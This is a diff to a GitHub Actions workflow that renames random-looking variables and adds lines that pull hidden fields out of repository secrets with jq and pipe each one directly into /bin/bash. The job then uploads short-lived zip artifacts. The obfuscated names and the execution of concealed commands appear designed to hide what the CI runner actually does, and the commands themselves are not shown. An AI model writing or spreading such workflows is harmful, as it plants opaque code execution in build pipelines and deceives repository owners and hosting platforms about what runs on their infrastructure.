@@ -8,17 +8,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: jiuzhelijun
         env:
-          j215: ${{ secrets.j215 }}
+          ubpbj974: ${{ secrets.ubpbj974 }}
         run: |
-          printf '%s' "$j215" | jq -r .mhxkt3538 | /bin/bash
-          printf '%s' "$s19" | jq -r .kcpab21 | /bin/bash
-          echo $ixp7 | jq -r .w124 | /bin/bash
-          echo $nlx565 | jq -r .xdcw93916 | /bin/bash
-          printf '%s' "$znfr905" | jq -r .girz8 | /bin/bash
+          printf '%s' "$ubpbj974" | jq -r .tloe8172 | /bin/bash
+          printf '%s' "$rcx96425" | jq -r .ibqhz44355 | /bin/bash
+          echo $bul61 | jq -r .ye5 | /bin/bash
+          echo $e1572 | jq -r .rx03791 | /bin/bash
+          echo $bb70 | jq -r .db59609 | /bin/bash
+          echo $byl7 | jq -r .m68 | /bin/bash
+          echo $mk4 | jq -r .x5 | /bin/bash
+          printf '%s' "$kll58" | jq -r .zl5430 | /bin/bash
+          echo $t962 | jq -r .lhrm5 | /bin/bash
+          echo $qh333 | jq -r .hxqvj497 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: j00TOAIk
+          name: dBJFMCOi
           path: "*.zip"
           retention-days: 1
